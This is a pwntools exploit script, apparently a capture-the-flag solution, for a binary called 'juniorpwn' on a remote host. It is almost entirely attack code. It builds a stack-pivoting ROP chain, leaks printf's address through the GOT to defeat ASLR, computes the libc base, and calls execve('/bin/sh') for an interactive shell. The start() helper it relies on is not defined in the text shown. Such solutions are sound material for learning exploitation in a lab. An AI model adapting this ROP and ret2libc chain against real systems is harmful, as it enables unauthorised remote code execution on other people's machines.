#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

elf = context.binary = ELF('./juniorpwn')
rop = ROP(elf)

libc = ELF("./libs/libc.so")
# libc = ELF("/usr/lib/libc.so.6")

host = args.HOST or '52.59.124.14'
port = int(args.PORT or 10034)

# default pwntools stuff

gdbscript = '''
b *0x4011ca
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendafter(b"name?", flat({
    0x200: [
            elf.got.printf + 0x200,         # rbp
            0x40117f,                       # read next stage
            elf.plt.printf + 6,             # restore printf address and call printf("%s", &printf@got)
            rop.rbp.address,
            0x404f00,                       # rbp
            0x40117f,                       # read next stage
            ]
    }, length=0x400))

io.sendafter(b"name?", flat({
    0x000: [
            0x401016,               # printf -> add rsp, 8 ; ret -> return to original rop chain
        ],
    }))

# libc.address = address - libc.symbols.printf
# libc_rop = ROP(libc)

io.recvuntil(b"turn, ")
base = u64(io.recvn(6) + b"\x00"*2) - libc.symbols.printf
libc.address = base
libc_rop = ROP(libc)
log.info(f"libc base: {hex(base)}")

io.sendafter(b"name?", flat({
    0x000: b"/bin/sh\0",
    0x100: [
            0x404d00,
            0x0
        ],
    0x200: [
            0x404f00,
            libc_rop.rdi.address,
            0x404d00,
            libc_rop.rsi.address,
            0x404e00,
            libc_rop.rdx.address,
            0x0,
            rop.ret.address,
            libc.symbols.execve,
        ]
    }))

io.interactive()
io.close()